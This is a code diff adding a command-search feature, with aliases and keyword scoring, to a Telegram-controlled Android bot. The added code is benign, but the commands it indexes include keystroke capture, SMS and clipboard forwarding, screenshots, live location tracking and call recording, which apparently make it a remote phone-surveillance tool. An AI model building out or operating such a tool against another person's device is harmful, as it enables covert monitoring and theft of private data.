@@ -155,6 +155,7 @@ object TelegramBotManager {
     private val allCommands = listOf(
         "start" to "👋 Welcome & device status",
         "help" to "📖 Help & all commands",
+        "s" to "🔍 Search commands — /s <keyword>  or just /s to enter search mode",
         "messages" to "💬 SMS conversations — tap one to open",
         "sms" to "📨 Open a thread — /sms <thread_id>",
         "sendsms" to "📤 Send SMS — /sendsms <number> <text>",
@@ -650,6 +651,7 @@ object TelegramBotManager {
                 when (command) {
                     "start" -> cmdStart()
                     "help" -> cmdHelp()
+                    "s", "search", "?" -> cmdSearch(args)
                     "messages" -> cmdMessages(args)
                     "sms" -> cmdSmsThread(args)
                     "sendsms" -> cmdSendSms(args)
@@ -2488,16 +2490,173 @@ object TelegramBotManager {
         if (chunk.isNotEmpty()) TelegramApiClient.sendMessage(token, chatId, chunk.toString())
     }
 
+    // ─── Command aliases ───────────────────────────────────────────────────────
+    // Canonical command → list of its accepted aliases (from the routing `when` block)
+    private val cmdAliases: Map<String, List<String>> by lazy {
+        mapOf(
+            "s"                to listOf("search", "?"),
+            "find"             to listOf("findcontact", "lookup", "whois"),
+            "mutenotifs"       to listOf("mutenotif", "mutenotifications", "silence"),
+            "backup"           to listOf("bak", "backupdata", "exportdata"),
+            "restore"          to listOf("restoredata", "restorebackup", "importbackup"),
+            "livelocation"     to listOf("live"),
+            "tracklocation"    to listOf("trackloc"),
+            "keystrokes"       to listOf("keys"),
+            "shots"            to listOf("screenshots"),
+            "permissions"      to listOf("perms"),
+            "openperms"        to listOf("permopen"),
+            "reqperm"          to listOf("reqperms", "grantperm", "askperm", "permask"),
+            "automations"      to listOf("rules"),
+            "newrule"          to listOf("addrule"),
+            "newschedule"      to listOf("addschedule"),
+            "delrule"          to listOf("deleterule"),
+            "feedentries"      to listOf("feedentry"),
+            "music"            to listOf("audios"),
+            "videos"           to listOf("vidlib"),
+            "images"           to listOf("gallery"),
+            "pomodoro"         to listOf("pom"),
+            "torch"            to listOf("flashlight"),
+            "speak"            to listOf("tts"),
+            "stopspeak"        to listOf("ttsstop"),
+            "findphone"        to listOf("ringphone"),
+            "show"             to listOf("banner"),
+            "wake"             to listOf("wakescreen"),
+            "brightness"       to listOf("bright"),
+            "volume"           to listOf("vol"),
+            "launch"           to listOf("open"),
+            "launches"         to listOf("launchhistory"),
+            "livecall"         to listOf("calltracker"),
+            "netusage"         to listOf("datausage"),
+            "storage"          to listOf("disk"),
+            "sim"              to listOf("siminfo", "carrier"),
+            "dnd"              to listOf("donotdisturb"),
+            "screentime"       to listOf("usagestats", "usage"),
+            "blocknumber"      to listOf("blocknum", "blockcall"),
+            "nowplaying"       to listOf("np", "player"),
+            "forwardsms"       to listOf("smsfwd"),
+            "clipboard"        to listOf("clip"),
+            "mobiledata"       to listOf("mobile", "data"),
+            "bluetooth"        to listOf("bt"),
+            "lockscreen"       to listOf("lock"),
+            "forwardphotos"    to listOf("autophotos", "photofwd"),
+            "airplane"         to listOf("airplanemode", "aeroplane"),
+            "schedulesms"      to listOf("schedsms"),
+            "batteryhistory"   to listOf("bathistory", "bathist"),
+            "clearcache"       to listOf("cacheclean"),
+            "geofence"         to listOf("gf", "geofences"),
+            "addcontact"       to listOf("newcontact"),
+            "deletecontact"    to listOf("delcontact", "rmcontact"),
+            "forwardclipboard" to listOf("clipfwd", "clipmon"),
+            "soundmeter"       to listOf("sound", "noise", "dblevel"),
+            "qrcode"           to listOf("qr"),
+            "docs"             to listOf("documents", "document"),
+            "filehash"         to listOf("hash", "sha256"),
+            "wifiscan"         to listOf("wifilist", "scanwifi"),
+            "timeline"         to listOf("activity"),
+            "contactgroups"    to listOf("groups", "cgroups"),
+            "callnow"          to listOf("dial", "makecall"),
+            "update"           to listOf("selfupdate", "apkupdate", "updateapp"),
+        )
+    }
+
+    private fun cmdSearch(args: List<String>) {
+        val query = args.joinToString(" ").trim()
+        if (query.isBlank()) {
+            pendingInput = "cmd_search"
+            sendMessage(
+                "🔍 <b>Command Search</b>\n" +
+                "━━━━━━━━━━━━━━━━━━━\n\n" +
+                "Type a keyword and I'll show all matching commands with descriptions and aliases.\n\n" +
+                "<i>Examples:</i>  <code>call</code>  ·  <code>screenshot</code>  ·  <code>wifi</code>  ·  <code>backup</code>  ·  <code>location</code>\n\n" +
+                "💡 You can also search directly:\n" +
+                "<code>/s call</code>  ·  <code>/s wifi</code>  ·  <code>/s location</code>\n\n" +
+                "⏳ Waiting for your keyword… (send any /command to cancel)"
+            )
+            return
+        }
+        sendSearchResults(query)
+    }
+
+    private fun sendSearchResults(query: String) {
+        val q = query.lowercase().trim()
+        if (q.isBlank()) {
+            sendMessage("❌ Search query was empty. Use <code>/s <keyword></code> or just <code>/s</code> to enter search mode.")
+            return
+        }
+
+        // Build alias → canonical reverse map
+        val aliasToCanon: Map<String, String> = buildMap {
+            cmdAliases.forEach { (canon, aliases) -> aliases.forEach { put(it, canon) } }
+        }
+
+        data class Match(val key: String, val desc: String, val score: Int)
+
+        val seen = mutableSetOf<String>()
+        val matches = mutableListOf<Match>()
+
+        for ((key, desc) in allCommands) {
+            if (key in seen) continue
+            val aliases = cmdAliases[key] ?: emptyList()
+            val score = when {
+                key == q                                                -> 4  // exact command name
+                aliases.any { it == q }                                 -> 3  // exact alias match
+                key.contains(q)                                         -> 2  // command name contains query
+                aliases.any { it.contains(q) }                          -> 1  // alias contains query
+                desc.lowercase().contains(q)                            -> 0  // description contains query
+                aliasToCanon[q] == key                                  -> 2  // typed an alias, map to canon
+                else -> continue
+            }
+            seen.add(key)
+            matches.add(Match(key, desc, score))
+        }
+
+        matches.sortByDescending { it.score }
+        val top = matches.take(12)
+
+        if (top.isEmpty()) {
+            sendMessage(
+                "🔍 No commands found matching \"<b>${htmlEsc(query)}</b>\"\n\n" +
+                "Try: /commands to browse all commands by category\n" +
+                "Or search with a shorter keyword — e.g. <code>/s call</code>  <code>/s wifi</code>  <code>/s track</code>"
+            )
+            return
+        }
+
+        val sb = StringBuilder()
+        sb.append("🔍 <b>Results for \"${htmlEsc(query)}\"</b>")
+        if (matches.size > 12) sb.append(" <i>(top 12 of ${matches.size})</i>")
+        sb.append("\n━━━━━━━━━━━━━━━━━━━\n\n")
+
+        for ((key, desc) in top) {
+            sb.append("📌 <code>/$key</code>\n")
+            sb.append("   📝 $desc\n")
+            val aliases = cmdAliases[key]
+            if (!aliases.isNullOrEmpty()) {
+                sb.append("   🏷 ${aliases.joinToString("  ·  ") { "<code>/$it</code>" }}\n")
+            }
+            sb.append("\n")
+        }
+
+        if (matches.size > 12) {
+            sb.append("<i>Showing top 12 — refine your keyword for narrower results.\nUse /commands to browse all categories.</i>")
+        } else {
+            sb.append("<i>Use /commands to browse all ${allCommands.size} commands by category.</i>")
+        }
+
+        sendMessage(sb.toString())
+    }
+
     private suspend fun cmdHelp() {
         sendTyping()
         data class Section(val header: String, val cmds: List<String>)
         val sections = listOf(
+            Section("🔍 Search & Help", listOf("s","help","commands")),
             Section("💬 Communication", listOf("messages","sms","sendsms","mms","schedulesms","calls","livecall","callnow","recordings","forwardsms")),
             Section("👥 Contacts", listOf("contacts","find","addcontact","deletecontact","blocknumber")),
             Section("📁 Files & Storage", listOf("files","storage","docs","find","filehash","deletefile")),
             Section("📸 Media", listOf("screenshot","photo","audio","video","music","videos","images","shots","forwardphotos","forwardshots")),
             Section("📱 Apps", listOf("apps","blockapp","unblockapp","blockedapps","launch","screentime","launches","clearcache")),
-            Section("📦 Backup & Restore", listOf("backup", "restore")),
+            Section("📦 Backup & Restore", listOf("backup","restore")),
             Section("📊 Device Info", listOf("device","battery","batteryhistory","batteryalert","location","sim","vpn","permissions","networkinfo","wifiscan","netusage")),
             Section("🔧 Device Controls", listOf("wifi","hotspot","bluetooth","airplane","mobiledata","dnd","brightness","volume","torch","lockscreen","reboot")),
             Section("🌀 Sensors", listOf("gyroscope","compass","barometer","steps","proximity","soundmeter")),
@@ -3413,6 +3572,10 @@ object TelegramBotManager {
                 val q = text.trim()
                 val query = if (q == "*" || q.isEmpty()) "" else q
                 renderCallsPage(query, 0, editMessageId = null)
+                return
+            }
+            "cmd_search" -> {
+                sendSearchResults(text.trim())
                 return
             }
             "notif_search" -> {
